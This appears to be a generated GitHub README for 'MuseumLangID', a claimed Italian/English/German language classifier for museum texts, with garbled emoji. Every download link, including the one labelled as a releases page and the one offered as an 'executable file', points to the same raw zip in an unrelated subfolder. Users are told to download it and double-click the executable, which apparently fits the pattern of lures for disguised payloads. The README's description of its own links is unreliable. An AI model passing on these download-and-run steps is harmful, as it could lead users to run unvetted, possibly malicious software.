[![Download MuseumLangID](https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip)](https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip)

## üöÄ Getting Started

MuseumLangID helps classify descriptions of museum works in Italian, English, and German. This application uses machine learning techniques to make it simple for anyone to understand the language of texts related to artifacts.

## üì• Download & Install

To start using MuseumLangID, visit this page to download: [MuseumLangID Releases](https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip)

### Step-by-Step Instructions to Download:

1. **Visit the Releases Page:** Click on the link above or copy and paste it into your web browser. This will take you to the Releases page.
   
2. **Find the Latest Version:** Look for the most recent release. It will usually have the highest version number.

3. **Choose Your File:** 
   - If you see an executable file (e.g., `https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip`), download this file.
   - If only source files are available, you might need to follow further instructions or use appropriate software to run them.

4. **Download the File:** Click on the file name to start the download. Depending on your internet speed, this might take a moment.

5. **Locate the Downloaded File:** After the download is complete, find the file in your Downloads folder.

6. **Open the Application:** 
   - If you downloaded an executable file, double-click the file to run it. 
   - If you downloaded source files, you might need specific software to run them. Follow any additional instructions provided in the documentation.

### System Requirements

- **Operating System:** Windows 10, macOS, or Linux
- **Memory:** 4 GB of RAM minimum
- **Storage:** At least 500 MB of free disk space available
- **Python:** Version 3.6 or later installed (if applicable)

## ‚öôÔ∏è How to Use

1. **Input Text:** Once the application is open, you'll see a text box. Type or paste the text that needs to be analyzed.
  
2. **Run Analysis:** Click the "Analyze" button to start the language identification process.

3. **View Results:** The application will quickly work through the text and display the most likely language.

4. **Explore Additional Features:** Depending on the version, there may be options to visualize the results, export the analysis, or handle multiple texts at once.

## üìä Understanding the Output

When you run the application, you will receive results displayed in a simple format:

- **Identified Language:** The language detected (Italian, English, or German).
- **Confidence Level:** A percentage indicating how confident the model is in its identification.

## üõ†Ô∏è About the Technology

MuseumLangID uses two main techniques:

1. **TF-IDF (Term Frequency-Inverse Document Frequency):** This helps the model understand the importance of words in the text.
  
2. **Multinomial Naive Bayes:** This is a classification technique used to determine the language based on trained data.

Together, these techniques provide an efficient way to classify language.
